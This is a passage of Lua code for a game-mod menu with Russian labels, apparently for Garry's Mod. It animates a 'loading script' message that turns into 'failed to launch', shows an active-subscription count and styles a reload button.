function loaderscreenbut()
textloaderscr:SetVisible( false )
textloaderscr:SetVisible( true )

gavteeesk:SetVisible( false );
loaderss:SetVisible( true );
--unikidbutton:SetVisible( false );
textloaderscr:SetText( "   Загрузка скрипта..." )
timer.Create (  "loadermenusss" , 8 , 0 , function ( ) 

timer.Destroy("loadermenusss")
timer.Destroy("textmenuloadersss")
timer.Destroy("loadermenusss111")
timer.Destroy("loadermenusss222")
timer.Destroy("loadermenusss333")
textloaderscr:SetText( " Не удалось запустить" )

timer.Simple(2, function()
gavteeesk:SetVisible( true );
loaderss:SetVisible( false );
unikidbutton:SetVisible( true );
end)

end)

function timercreee()
timer.Create (  "loadermenusss111" , 1 , 1 , function ( ) 
textloaderscr:SetText( "   Загрузка скрипта." )
timer.Create (  "loadermenusss222" , 1 , 1 , function ( ) 
textloaderscr:SetText( "   Загрузка скрипта.." )
timer.Create (  "loadermenusss333" , 1 , 1 , function ( ) 
textloaderscr:SetText( "   Загрузка скрипта..." )
end)
end)
end)
end

timercreee()
timer.Create (  "textmenuloadersss" , 3 , 0 , function ( )
timercreee()
end)




end

twxxxx:SetVisible( true )
function addnumbers()

if numbersch == 0 then
twxxxx:SetText( "           У вас нет активных подписок!!!!" )
twxxxx:SetVisible( true )
showofflabelbody()
elseif numbersch == 1 then
twxxxx:SetText( "           У вас 1 активная подписка :)" )
showonlabelbody()
twxxxx:SetVisible( false )
elseif numbersch >= 2 && numbersch <= 4 then
twxxxx:SetText( "           У вас "..numbersch.." активные подписки :) :)" )
showonlabelbody()
twxxxx:SetVisible( false )
elseif numbersch >= 5 then
twxxxx:SetText( "           У вас "..numbersch.." активных подписок :) :) :)" )
showonlabelbody()
twxxxx:SetVisible( false )
end

end

















--кнопка обновить
buttonreload:SetSize(94, 30)
buttonreload:SetPos( 215, 43)
--buttonreload:SetText("")
buttonreload:SetFont(getfontfe(1))
/*
buttonreload.Paint = function( self, w, h)
--raw.RoundedBox( 15, 0, 0, w, h, Color(50, 205, 50, 200))
draw.RoundedBoxEx( 15, 0, 0, w, h, Color(0, 0, 0, 200), false, false, false, false )
draw.SimpleText("Обновить", getfontfe(1), w / 2, h / 2.0, Color( 190, 190, 190 ), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

surface.SetDrawColor( getcolormixer(1, 128) )
surface.DrawOutlinedRect( 0, 0, 94, 30, 3 )
end
*/

            buttonreload.Paint = function( this, w, h )
				createpainbttonset(
					"Обновить",
